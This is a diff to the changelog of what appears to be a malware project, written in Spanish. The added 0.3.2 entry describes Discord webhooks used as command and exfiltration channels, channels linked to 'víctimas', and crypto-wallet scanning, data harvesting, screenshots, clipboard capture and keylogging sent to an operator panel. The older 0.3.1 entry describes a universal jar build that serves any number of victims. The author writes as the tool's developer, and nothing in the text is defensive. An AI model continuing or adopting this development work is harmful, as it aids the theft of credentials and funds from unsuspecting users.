@@ -1,5 +1,11 @@
 # Changelog
 
+## 0.3.2
+
+- Puente local Discord↔panel: canales `sync-*` se enlazan a víctimas, adjuntos y avisos se indexan, y las tareas del panel se envían por webhook. Permite operar sin VPS.
+- El módulo cripto cae a ZIP plano por Discord cuando la API no responde; `scan_wallets`, `harvest`, `screenshot`, clipboard y keylogs llegan al panel.
+- Presencia solo por mensajes reales del agente, no por los `ping` del puente.
+
 ## 0.3.1
 
 - Release universal: el jar publicado vuelve a llevar un `config.json` fijo con una build universal, así que el mismo archivo sirve para cualquier número de víctimas sin compilar uno por persona. El generador por build sigue disponible en el panel.
